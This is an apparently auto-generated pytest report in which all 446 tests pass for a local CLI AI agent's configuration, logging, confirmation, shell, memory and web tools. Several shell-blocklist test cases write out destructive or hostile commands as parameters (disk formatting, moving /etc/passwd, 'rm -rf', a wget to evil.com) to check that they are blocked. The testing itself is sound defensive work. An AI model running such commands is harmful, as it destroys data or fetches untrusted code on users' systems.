...
Generated: 2026-08-27 20:00:30

**Total:** 446 &nbsp;|&nbsp; **Passed:** 446 &nbsp;|&nbsp; **Failed:** 0 &nbsp;|&nbsp; **Skipped:** 0 &nbsp;|&nbsp; **Errors:** 0 &nbsp;|&nbsp; **Duration:** 19.62s
...
| AGENTCFG-001 | `tests/test_agent_config.py::TestEnvBool::test_truthy_values[TRUE]` | ✅ passed | 0.005 |
...
| AGENTCFG-011 | `tests/test_agent_config.py::TestEnvSet::test_missing_env_var_uses_default` | ✅ passed | 0.001 |
| AGENTCFG-012 | `tests/test_agent_config.py::TestEnvSet::test_comma_separated_parsed_into_set` | ✅ passed | 0.001 |
...
| AGENTCFG-026 | `tests/test_agent_config.py::TestSystemPromptOverride::test_env_var_overrides_default_prompt` | ✅ passed | 0.085 |
...
| AGENTCFG-030 | `tests/test_agent_config.py::TestDefaultConstants::test_workspace_dir_is_not_inside_agent_source_dir` | ✅ passed | 0.007 |
...
| AUTORUN-019 | `tests/test_auto_runner.py::TestRunWithAutoMode::test_unlimited_mode_passes_none_max_tool_calls` | ✅ passed | 0.001 |
| CFGRELOAD-001 | `tests/test_config_reload.py::test_reload_all_reloads_agent_config` | ✅ passed | 0.124 |
| CFGRELOAD-002 | `tests/test_config_reload.py::test_reload_propagates_unaliased_variables` | ✅ passed | 0.101 |
| CFGRELOAD-003 | `tests/test_config_reload.py::test_reload_propagates_aliased_variables` | ✅ passed | 0.123 |
| CFGRELOAD-004 | `tests/test_config_reload.py::test_reload_recomputes_derived_base_dir` | ✅ passed | 0.127 |
| CFGRELOAD-005 | `tests/test_config_reload.py::test_reload_recomputes_derived_memory_path` | ✅ passed | 0.132 |
| CFGRELOAD-006 | `tests/test_config_reload.py::test_reload_clears_cached_agent_bridge_singleton` | ✅ passed | 0.129 |
| CFGRELOAD-007 | `tests/test_config_reload.py::test_reload_skips_unimported_modules_safely` | ✅ passed | 0.140 |
| CFGRELOAD-008 | `tests/test_config_reload.py::test_reload_propagates_be_modules` | ✅ passed | 0.134 |
| CFGRELOAD-009 | `tests/test_config_reload.py::test_reload_propagates_chat_api_system_prompt_live` | ✅ passed | 0.142 |
| CFGRELOAD-010 | `tests/test_config_reload.py::test_reload_recomputes_tool_bridge_base_dir` | ✅ passed | 0.134 |
| CFGRELOAD-011 | `tests/test_config_reload.py::test_reload_propagates_unlimited_mode_to_every_gated_module` | ✅ passed | 0.142 |
...
| CHATLOG-014 | `tests/test_chat_logger.py::TestChatLoggerEvents::test_model_call_start_logs_tool_names` | ✅ passed | 0.002 |
...
| CHATLOG-022 | `tests/test_chat_logger.py::TestChatLoggerEvents::test_session_end_default_reason` | ✅ passed | 0.001 |
...
| CHATLOG-027 | `tests/test_chat_logger.py::TestChatLoggerRotation::test_rotates_when_exceeding_max_bytes` | ✅ passed | 0.006 |
| CHATLOG-028 | `tests/test_chat_logger.py::TestChatLoggerRotation::test_rotation_disabled_when_limit_is_none` | ✅ passed | 0.002 |
...
| CHATLOG-043 | `tests/test_chat_logger.py::TestMaskSecrets::test_disabled_via_config_is_a_noop` | ✅ passed | 0.001 |
...
| CONFIRM-008 | `tests/test_confirm.py::TestConfirmAnswers::test_approves_on_yes_variants_and_bare_enter[y]` | ✅ passed | 0.002 |
| CONFIRM-008 | `tests/test_confirm.py::TestConfirmAnswers::test_approves_on_yes_variants_and_bare_enter[yes]` | ✅ passed | 0.001 |
...
| CONFIRM-012 | `tests/test_confirm.py::TestConfirmAnswers::test_denies_on_unexpected_exception` | ✅ passed | 0.032 |
...
| CONFIRM-024 | `tests/test_confirm.py::TestStdinLockRace::test_second_confirm_denied_while_first_still_holds_lock` | ✅ passed | 0.052 |
...
| CONFIRM-028 | `tests/test_confirm.py::TestStdinLockRace::test_lock_not_held_after_no_tty_denial` | ✅ passed | 0.001 |
...
| CONFIRM-041 | `tests/test_confirm.py::TestConfirmBackend::test_set_confirm_backend_handles_exception_as_false` | ✅ passed | 0.008 |
...
| FSTOOLS-005 | `tests/test_fs_tools.py::TestResolvePath::test_empty_string_raises` | ✅ passed | 0.001 |
...
| FSTOOLS-022 | `tests/test_fs_tools.py::TestWriteFile::test_overwrites_existing_file` | ✅ passed | 0.005 |
...
| FSTOOLS-031 | `tests/test_fs_tools.py::TestListDirectory::test_lists_files_and_dirs_with_kind_prefix` | ✅ passed | 0.002 |
| FSTOOLS-032 | `tests/test_fs_tools.py::TestListDirectory::test_dirs_sorted_before_files` | ✅ passed | 0.002 |
...
| FULLAGENT-002 | `tests/test_CLI_agent_main.py::TestMain::test_exit_synonyms_case_insensitive[EXIT]` | ✅ passed | 0.019 |
| FULLAGENT-002 | `tests/test_CLI_agent_main.py::TestMain::test_exit_synonyms_case_insensitive[Quit]` | ✅ passed | 0.017 |
| FULLAGENT-002 | `tests/test_CLI_agent_main.py::TestMain::test_exit_synonyms_case_insensitive[exit]` | ✅ passed | 0.015 |
| FULLAGENT-002 | `tests/test_CLI_agent_main.py::TestMain::test_exit_synonyms_case_insensitive[q]` | ✅ passed | 0.021 |
| FULLAGENT-002 | `tests/test_CLI_agent_main.py::TestMain::test_exit_synonyms_case_insensitive[quit]` | ✅ passed | 0.015 |
| FULLAGENT-003 | `tests/test_CLI_agent_main.py::TestMain::test_user_message_is_logged_and_agent_is_run` | ✅ passed | 0.022 |
| FULLAGENT-004 | `tests/test_CLI_agent_main.py::TestMain::test_system_prompt_seeded_as_first_message` | ✅ passed | 0.018 |
| FULLAGENT-005 | `tests/test_CLI_agent_main.py::TestMain::test_keyboard_interrupt_during_input_ends_session` | ✅ passed | 0.018 |
| FULLAGENT-006 | `tests/test_CLI_agent_main.py::TestMain::test_unexpected_exception_is_logged_and_reraised` | ✅ passed | 0.019 |
| FULLAGENT-007 | `tests/test_CLI_agent_main.py::TestMain::test_tool_map_wires_all_nine_real_functions` | ✅ passed | 0.000 |
| FULLAGENT-008 | `tests/test_CLI_agent_main.py::TestMain::test_run_agent_is_offered_exactly_nine_tools` | ✅ passed | 0.019 |
| FULLAGENT-009 | `tests/test_CLI_agent_main.py::TestMain::test_step_mode_default_calls_run_agent_not_auto` | ✅ passed | 0.021 |
| FULLAGENT-010 | `tests/test_CLI_agent_main.py::TestMain::test_auto_mode_true_calls_run_with_auto_mode_not_run_agent` | ✅ passed | 0.023 |
...
| FULLAGENT-014 | `tests/test_CLI_agent_main.py::TestSaveSessionSummaryWiring::test_crash_path_does_not_call_save_session_summary` | ✅ passed | 0.018 |
| FULLAGENT-015 | `tests/test_CLI_agent_main.py::TestTokenUsageWiring::test_startup_prints_loaded_token_total` | ✅ passed | 0.003 |
| FULLAGENT-016 | `tests/test_CLI_agent_main.py::TestTokenUsageWiring::test_exit_command_calls_save_token_usage_with_session_total` | ✅ passed | 0.012 |
| FULLAGENT-017 | `tests/test_CLI_agent_main.py::TestTokenUsageWiring::test_exit_command_prints_session_and_alltime_totals` | ✅ passed | 0.010 |
| FULLAGENT-018 | `tests/test_CLI_agent_main.py::TestTokenUsageWiring::test_keyboard_interrupt_calls_save_token_usage` | ✅ passed | 0.017 |
| FULLAGENT-019 | `tests/test_CLI_agent_main.py::TestTokenUsageWiring::test_crash_path_still_calls_save_token_usage` | ✅ passed | 0.021 |
| FULLAGENT-020 | `tests/test_CLI_agent_main.py::TestTokenUsageWiring::test_non_int_total_tokens_coerced_to_zero` | ✅ passed | 0.009 |
...
| HUMAN-005 | `tests/test_human_tools.py::TestAskHumanChoice::test_returns_selected_option_on_valid_choice` | ✅ passed | 0.001 |
| HUMAN-006 | `tests/test_human_tools.py::TestAskHumanChoice::test_reprompts_on_non_numeric_input` | ✅ passed | 0.001 |
...
| HUMAN-012 | `tests/test_human_tools.py::TestAskHumanChoice::test_prints_numbered_options` | ✅ passed | 0.001 |
...
| LOGCFG-002 | `tests/test_log_config.py::TestEnvBool::test_falsy_or_unrecognized_values[]` | ✅ passed | 0.001 |
...
| LOGCFG-007 | `tests/test_log_config.py::TestEnvIntOrNone::test_missing_env_var_default_none` | ✅ passed | 0.001 |
| LOGCFG-008 | `tests/test_log_config.py::TestEnvIntOrNone::test_literal_none_string_returns_none[  none  ]` | ✅ passed | 0.000 |
| LOGCFG-008 | `tests/test_log_config.py::TestEnvIntOrNone::test_literal_none_string_returns_none[NONE]` | ✅ passed | 0.000 |
| LOGCFG-008 | `tests/test_log_config.py::TestEnvIntOrNone::test_literal_none_string_returns_none[None]` | ✅ passed | 0.000 |
| LOGCFG-008 | `tests/test_log_config.py::TestEnvIntOrNone::test_literal_none_string_returns_none[none]` | ✅ passed | 0.000 |
| LOGCFG-009 | `tests/test_log_config.py::TestEnvIntOrNone::test_numeric_string_parsed_as_int` | ✅ passed | 0.001 |
...
| MEMORY-006 | `tests/test_memory.py::TestRememberFact::test_text_truncated_to_max_chars` | ✅ passed | 0.006 |
| MEMORY-007 | `tests/test_memory.py::TestRememberFact::test_disabled_memory_does_not_write` | ✅ passed | 0.001 |
...
| MEMORY-029 | `tests/test_memory.py::TestAtomicWrite::test_no_leftover_temp_file_after_save` | ✅ passed | 0.002 |
| MEMORY-030 | `tests/test_memory.py::TestAtomicWrite::test_final_file_is_valid_json_after_multiple_saves` | ✅ passed | 0.002 |
...
| SHARED-020 | `tests/test_shared.py::TestOllamaAgentChat::test_returns_response_on_first_success` | ✅ passed | 0.116 |
| SHARED-021 | `tests/test_shared.py::TestOllamaAgentChat::test_retries_transient_failure_then_succeeds` | ✅ passed | 0.147 |
| SHARED-022 | `tests/test_shared.py::TestOllamaAgentChat::test_raises_friendly_runtime_error_after_all_retries_fail` | ✅ passed | 0.127 |
| SHARED-023 | `tests/test_shared.py::TestOllamaAgentChat::test_default_model_used_when_none_specified` | ✅ passed | 0.123 |
| SHARED-024 | `tests/test_shared.py::TestOllamaAgentChatStream::test_yields_chunks` | ✅ passed | 0.144 |
| SHARED-025 | `tests/test_shared.py::TestOllamaAgentChatStream::test_raises_friendly_runtime_error_on_failure` | ✅ passed | 0.140 |
...
| SHARED-028 | `tests/test_shared.py::TestRunAgent::test_executes_tool_and_returns_final_answer_next_round` | ✅ passed | 0.005 |
| SHARED-029 | `tests/test_shared.py::TestRunAgent::test_unknown_tool_reported_as_error_observation` | ✅ passed | 0.001 |
| SHARED-030 | `tests/test_shared.py::TestRunAgent::test_tool_exception_reported_not_raised` | ✅ passed | 0.032 |
...
| SHARED-033 | `tests/test_shared.py::TestRunAgent::test_stuck_loop_detection_stops_after_repeated_identical_calls` | ✅ passed | 0.008 |
| SHARED-034 | `tests/test_shared.py::TestRunAgent::test_chat_failure_returns_stopped_message_not_raise` | ✅ passed | 0.008 |
...
| SHARED-036 | `tests/test_shared.py::TestRunAgent::test_max_iterations_reached_when_always_calling_tools` | ✅ passed | 0.004 |
| SHARED-037 | `tests/test_shared.py::TestRunAgent::test_wall_timeout_stops_run` | ✅ passed | 0.005 |
...
| SHARED-040 | `tests/test_shared.py::TestRunAgent::test_max_tool_calls_stops_run_at_the_cap` | ✅ passed | 0.004 |
| SHARED-041 | `tests/test_shared.py::TestRunAgent::test_max_tool_calls_capped_call_never_reaches_the_tool` | ✅ passed | 0.003 |
| SHARED-042 | `tests/test_shared.py::TestRunAgent::test_max_tool_calls_none_leaves_run_uncapped` | ✅ passed | 0.002 |
| SHARED-043 | `tests/test_shared.py::TestValidateArguments::test_matching_arguments_pass_silently` | ✅ passed | 0.000 |
| SHARED-044 | `tests/test_shared.py::TestValidateArguments::test_missing_required_parameter_raises` | ✅ passed | 0.005 |
...
| SHARED-048 | `tests/test_shared.py::TestValidateArguments::test_no_argument_function_accepts_empty_dict` | ✅ passed | 0.001 |
| SHARED-049 | `tests/test_shared.py::TestRunAgent::test_mismatched_arguments_reported_without_calling_the_tool` | ✅ passed | 0.001 |
| SHARED-050 | `tests/test_shared.py::TestRunAgent::test_stuck_loop_detection_catches_alternating_ab_pattern` | ✅ passed | 0.012 |
...
| SHARED-053 | `tests/test_shared.py::TestOllamaAgentChat::test_total_tokens_starts_at_zero` | ✅ passed | 0.114 |
| SHARED-054 | `tests/test_shared.py::TestOllamaAgentChat::test_total_tokens_accumulates_prompt_and_eval_counts` | ✅ passed | 0.129 |
| SHARED-055 | `tests/test_shared.py::TestOllamaAgentChat::test_total_tokens_accumulates_across_multiple_calls` | ✅ passed | 0.128 |
| SHARED-056 | `tests/test_shared.py::TestOllamaAgentChat::test_total_tokens_missing_fields_count_as_zero` | ✅ passed | 0.166 |
| SHARED-057 | `tests/test_shared.py::TestOllamaAgentChat::test_total_tokens_not_incremented_on_failed_call` | ✅ passed | 0.147 |
| SHARED-058 | `tests/test_shared.py::TestOllamaAgentChatStream::test_last_stream_stats_none_before_any_call` | ✅ passed | 0.164 |
| SHARED-059 | `tests/test_shared.py::TestOllamaAgentChatStream::test_final_done_chunk_populates_stats_and_total_tokens` | ✅ passed | 0.153 |
| SHARED-060 | `tests/test_shared.py::TestOllamaAgentChatStream::test_no_done_chunk_leaves_stats_and_tokens_untouched` | ✅ passed | 0.123 |
| SHARED-061 | `tests/test_shared.py::TestOllamaAgentChatStream::test_stall_raises_runtime_error_after_idle_timeout` | ✅ passed | 0.239 |
...
| SHARED-068 | `tests/test_shared.py::TestOllamaAgentChatStream::test_unlimited_mode_bypasses_stream_idle_timeout` | ✅ passed | 0.313 |
| SHARED-069 | `tests/test_shared.py::TestOllamaAgentChat::test_unlimited_mode_bypasses_chat_timeout` | ✅ passed | 0.304 |
| SHARED-070 | `tests/test_shared.py::TestRunAgent::test_unlimited_mode_skips_wall_timeout` | ✅ passed | 0.000 |
| SHARED-071 | `tests/test_shared.py::TestRunAgent::test_unlimited_mode_ignores_max_iterations_cap` | ✅ passed | 0.011 |
...
| SHELL-007 | `tests/test_shell_tools.py::TestBlocklist::test_dangerous_patterns_blocked_when_confirm_denies[python3 -c 'x' && mkfs.ext4 /dev/sda]` | ✅ passed | 0.001 |
| SHELL-007 | `tests/test_shell_tools.py::TestBlocklist::test_dangerous_patterns_blocked_when_confirm_denies[python3 -c 'x' && mv /etc/passwd /tmp]` | ✅ passed | 0.001 |
| SHELL-007 | `tests/test_shell_tools.py::TestBlocklist::test_dangerous_patterns_blocked_when_confirm_denies[python3 -c 'x' && sudo ls]` | ✅ passed | 0.001 |
| SHELL-007 | `tests/test_shell_tools.py::TestBlocklist::test_dangerous_patterns_blocked_when_confirm_denies[python3 -c 'x' && wget http://evil.com]` | ✅ passed | 0.001 |
| SHELL-007 | `tests/test_shell_tools.py::TestBlocklist::test_dangerous_patterns_blocked_when_confirm_denies[python3 -c 'x'; rm -rf .]` | ✅ passed | 0.006 |
...
| SHELL-013 | `tests/test_shell_tools.py::TestExecution::test_successful_command_reports_exit_code_and_stdout` | ✅ passed | 0.002 |
...
| SHELL-017 | `tests/test_shell_tools.py::TestExecution::test_stdout_truncated_past_max_lines_keeps_last_lines` | ✅ passed | 0.001 |
| SHELL-018 | `tests/test_shell_tools.py::TestExecution::test_timeout_reports_none_exit_code_and_note` | ✅ passed | 0.001 |
| SHELL-019 | `tests/test_shell_tools.py::TestExecution::test_timeout_preserves_partial_output` | ✅ passed | 0.001 |
| SHELL-020 | `tests/test_shell_tools.py::TestExecution::test_unexpected_exception_returns_note_not_raise` | ✅ passed | 0.001 |
...
| SHELL-028 | `tests/test_shell_tools.py::TestCompoundOperatorForceAsk::test_compound_command_force_asks[echo $(cat file)]` | ✅ passed | 0.002 |
...
| SHELL-032 | `tests/test_shell_tools.py::TestExecution::test_timeout_kills_the_whole_process_group` | ✅ passed | 0.001 |
| SHELL-033 | `tests/test_shell_tools.py::TestExecution::test_killpg_failure_does_not_crash` | ✅ passed | 0.001 |
| SHELL-034 | `tests/test_shell_tools.py::TestExecution::test_unlimited_mode_passes_none_timeout_to_communicate` | ✅ passed | 0.001 |
| WEBTOOL-001 | `tests/test_web_tools.py::test_web_search_formats_ranked_results` | ✅ passed | 0.000 |
| WEBTOOL-002 | `tests/test_web_tools.py::test_web_search_clamps_max_results_to_config_ceiling` | ✅ passed | 0.000 |
| WEBTOOL-003 | `tests/test_web_tools.py::test_web_search_empty_query_is_rejected` | ✅ passed | 0.000 |
| WEBTOOL-004 | `tests/test_web_tools.py::test_web_search_missing_api_key` | ✅ passed | 0.000 |
| WEBTOOL-005 | `tests/test_web_tools.py::test_web_search_denied_by_confirm` | ✅ passed | 0.000 |
| WEBTOOL-006 | `tests/test_web_tools.py::test_web_search_response_error_is_friendly` | ✅ passed | 0.000 |
| WEBTOOL-007 | `tests/test_web_tools.py::test_web_fetch_returns_title_and_body` | ✅ passed | 0.001 |
| WEBTOOL-008 | `tests/test_web_tools.py::test_web_fetch_truncates_to_config_cap` | ✅ passed | 0.000 |
| WEBTOOL-009 | `tests/test_web_tools.py::test_web_fetch_rejects_non_http_scheme` | ✅ passed | 0.000 |
| WEBTOOL-010 | `tests/test_web_tools.py::test_web_fetch_missing_api_key` | ✅ passed | 0.000 |
| WEBTOOL-011 | `tests/test_web_tools.py::test_web_fetch_denied_by_confirm` | ✅ passed | 0.001 |
